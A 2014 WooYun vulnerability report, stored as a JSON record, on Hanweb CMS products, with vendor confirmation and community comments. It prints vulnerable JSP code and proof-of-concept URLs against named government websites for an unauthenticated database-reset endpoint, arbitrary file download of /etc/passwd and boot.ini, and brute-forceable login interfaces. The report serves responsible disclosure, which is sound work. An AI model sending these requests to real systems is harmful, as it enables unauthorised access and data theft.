{"id": 3819, "wybug_id": "wooyun-2014-052908", "wybug_title": "大汉相关系统漏洞合集（完结篇）", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "wefgod", "wybug_date": "2014-03-06 09:24", "wybug_open_date": "2014-06-04 09:25", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏校验", "逻辑错误", "任意文件下载", "设计不当导致攻击界面扩大", "越权", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-04：\t细节向公众公开  简要描述： 太折腾了，没精力了，太累了，完结篇了，以后估计不看鸟。而且厂商给的rank……rank不是你的，都算乌云的……不用太吝啬这个东西。简单提下内容：基本所有系统都存在的一处越权；JCMS  &  xxgk 通用的一处任意文件下载；JCMS  &  xxgk 通用的两处暴力破解接口；就这么当完结篇了！冲击我的1000rank，然后该稍微歇着了。 详细说明：  基本所有系统大部分版本都还存在的一个越权：\n<%@ page contentType=\"text/html;charset=UTF-8\"%><%@page import=\"com.hanweb.common.util.Convert\"%><%@page import=\"com.hanweb.sys.Install\"%><%\t\tString main_ip = Convert.getParameter( request,\"dbip\");\t\tString main_port = Convert.getParameter( request,\"dbport\");\t\tString main_dbname = Convert.getParameter( request,\"dbname\");\t\tString main_user = Convert.getParameter( request,\"dbuser\");\t\tString main_pwd1 = Convert.getParameter( request,\"dbpwd1\");\t\t//数据库类型\t\tString dbtype = Convert.getParameter( request,\"dbtype\");\t\tint ndbtype = Convert.getStringValueInt( dbtype );\t\tString strRealPath = application.getRealPath(\"\"); \t\t\t//创建表,初始化数据\t\tInstall install = new Install( strRealPath );\t\tboolean bl = install.setDBServer( ndbtype,main_ip,main_port,main_dbname,main_user,main_pwd1 );\t\tString strMessage = \"\";\t\t\t//修改配置文件\t\tString iniPath = strRealPath + \"/WEB-INF/ini/merpserver.ini\";\t\tcom.hanweb.common.util.IniFile ini = new com.hanweb.common.util.IniFile( iniPath );\t\tini.readIni();\t\tini.setIniValue(\"b_init\",\"1\");\t\tini.writeIni();\t\t\t//写日志文件\t\tString errpath = strRealPath + \"/setup/log/init_error.txt\";\t\tinstall.writeErrorLog( errpath );\t\t\t\tif( bl )\t\t\tstrMessage = \"创建成功，请重新启动中间件！\";\t\telse\t\t\tstrMessage = \"创建失败,请查看日志文件!\";\t\tout.println( Convert.getAlterScript( \" parent.createIndex.style.visibility='hidden';\") );\t\tout.println( Convert.getAlterScript( \"alert('\"+strMessage+\"');\") );%>\n初始化数据库到指定IP数据库服务器去的，大部分系统大部分版本都是处于没有验证的状态。给案例Source:http://www.gansu.gov.cn/source/setup/opr_initdb.jsp?dbip=1.1.1.1&db_port=1433&dbname=test&dbuser=admin123&dbpwd1=admin123&dbtype=2\n\nJiep:http://www.gansu.gov.cn/jiep/setup/opr_initdb.jsp?dbip=1.1.1.1&db_port=1433&dbname=test&dbuser=admin123&dbpwd1=admin123&dbtype=2\n\nVipchat:http://www.liaocheng.gov.cn/vipchat/setup/opr_initdb.jsp?dbip=1.1.1.1&db_port=1433&dbname=test&dbuser=admin123&dbpwd1=admin123&dbtype=2\n\nLMhttp://www.liaocheng.gov.cn/lm/setup/opr_initdb.jsp?dbip=1.1.1.1&db_port=1433&dbname=test&dbuser=admin123&dbpwd1=admin123&dbtype=2\n\n   漏洞证明：  JCMS  &  xxgk 任意文件下载关键代码：\n<%@page contentType=\"text/html;charset=UTF-8\"%><%@page import=\"jcms.util.DownFile\"%><%@page import=\"com.hanweb.common.util.Convert\"%><%\t//原文件名  \tString strFileName = Convert.getParameter(request,\"filename\");\t//要保存的文件名\tString  downloadname = Convert.getParameter(request,\"savename\");\t\t/*下载文件*/\t//downloadname = new String( downloadname.getBytes(\"GBK\"), \"iso-8859-1\");\t\tout.clear();    response.reset();    if(!DownFile.getFile(strFileName,downloadname,response,\"UTF-8\")){    \t//response.setContentType(\"text/html\");    \t//response.setCharacterEncoding(\"utf-8\");   \t\tout.println(Convert.getAlterScript(\"alert('下载失败，文件可能不存在！');\"));    }%>\n其中filename为绝对路径。先看xxgk的案例：http://xxgk.qidong.gov.cn/gov/m_5_9/downfile.jsp?filename=/etc/passwd&savename=1\n\nhttp://xxgk.tzhl.gov.cn/xxgk/m_5_9/downfile.jsp?filename=/etc/passwd&savename=1\n\nhttp://xxgk.qidong.gov.cn/gov/m_5_9/downfile.jsp?filename=/etc/passwd&savename=1\n\n再看JCMS的案例：http://www.xwzf.gov.cn/jcms/m_5_9/downfile.jsp?filename=/etc/passwd&savename=1\n\nhttp://www.huimin.gov.cn/jcms/m_5_9/downfile.jsp?filename=c:/boot.ini&savename=1\n\n暴力破解1——某接口可以暴力破解用户名密码\n<%@page contentType=\"text/html;charset=UTF-8\" %><%@page import=\"com.hanweb.common.util.Convert\"%><%@page import=\"com.hanweb.common.log.LogWriter\"%><jsp:useBean id=\"virify\" class=\"jcms.blf.receive.Verify\"></jsp:useBean><%String strErrorInfo = \"<html><body>error</body></html>\";String strOptions = \"\";// 准备数据String strLoginId = Convert.getParameter(request, \"userid\");String strPassword = Convert.getParameter(request, \"password\");// 验证用户if (!virify.isExist(strLoginId, strPassword)) {             LogWriter.error(\"Error: the user is not exists or password is wrong!\");\t\t\t\t\tout.write(strErrorInfo);} else {\t// 获取网站结构的xml\tstrOptions = virify.getUserWeb(strLoginId);\tout.write(strOptions);}%>\nhttp://www.gansu.gov.cn/xxgk/interface/web.jsp?userid=admin&password=#####正确情况下的回显：\n\n错误情况下的回显：\n\n工具测试发了5000多个请求，没问题，可破解成功，错误是33b，正确的56b\n\nJcms也是有用到类似的代码的：http://www.huimin.gov.cn/jcms/interface/web.jsp\n\n暴力破解也是可行的。暴力破解2——另一接口也可以暴力破解\n<%@page contentType=\"text/html;charset=UTF-8\" %><%@page import=\"com.hanweb.common.util.Convert\"%><%@page import=\"com.hanweb.common.log.LogWriter\"%><jsp:useBean id=\"virify\" class=\"jcms.blf.receive.Verify\"></jsp:useBean><%String strErrorInfo = \"<html><body>error</body></html>\";String strXML = \"\";// 准备数据String strLoginId = Convert.getParameter(request, \"userid\");String strPassword = Convert.getParameter(request, \"password\");// 验证用户if (!virify.isExist(strLoginId, strPassword)) {             LogWriter.error(\"Error: the user is not exists or password is wrong!\");\t\t\t\t\tout.write(strErrorInfo);} else {\t// 获取网站结构的xml\tstrXML = virify.getXML(strLoginId, strPassword, strErrorInfo);\tout.write(\"<html><body>\" + strXML + \"</body></html>\");}%>\nhttp://www.gansu.gov.cn/xxgk/interface/verify.jsp密码正确的情况：\n\n错误的情况：\n\nJcms案例：http://www.huimin.gov.cn/jcms/interface/verify.jsp不再进行测试。最后附送一处好像是越权的地方，厂商自己评估是否是开放给民众下载的通道：http://www.gansu.gov.cn/xxgk/jcms_files/jcms1/web1/site/zfxxgk/downinfo.jsp\n\n\n\n   修复方案：  嗯。辛苦了，拜拜了，哥歇着去了…………   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-03-06 10:06 厂商回复： 非常感谢您对大汉产品的关注以及对产品安全方面的指正，已经安排处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-06 09:29 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  贱人，发了合集才把源码给我    \n     2014-03-06 09:33 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  我不信是完结篇    \n     2014-03-06 09:37 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @pandas 不搞了，累。挖不出漏洞了就撤了哈。    \n     2014-03-06 09:38 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Passer_by 别乱说啊    \n     2014-03-06 10:01 |    \t\txiaokinghk \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:16        | 【DBA】)\t\t \n  @wefgod 求源码    \n     2014-03-06 10:35 |    \t\t刺刺 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:52        | 真正的安全并不是技术，而是人类善良的心灵...)\t\t \n  诚如洞主所言，rank给的太低，（礼物难道又是杯子和移动电源），打击了洞主的JJ性，而我们也失去了向洞主进一步学习的机会。假如rank能给高一点，我肯定会插一杠，抢点边角料的，哈哈。    \n     2014-03-06 10:46 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @刺刺 继续去搞啊，木有问题的    \n     2014-03-06 10:47 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @刺刺 不过为什么你会知道杯子？！    \n     2014-03-06 15:07 |    \t\tHaswell \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:18        | HorizonSec @ RDFZ)\t\t \n  火钳祝贺洞主1000rank    \n     2014-03-06 18:54 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  终于完了?    \n     2014-03-06 21:04 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @在路上 完结。    \n     2014-03-06 22:24 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  大牛    \n     2014-03-07 15:27 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  @wefgod 恭喜突破1k    \n     2014-03-10 13:48 |    \t\tBloodwolf \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:8        | whoami)\t\t \n  靠。求源码！！！    \n     2014-06-04 09:31 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  恭喜恭喜！！！    \n     2014-06-04 11:23 |    \t\tj14n \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:23        | 我是一只小小小小鸟....)\t\t \n  楼主测试的是大山东 惠民的网站    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}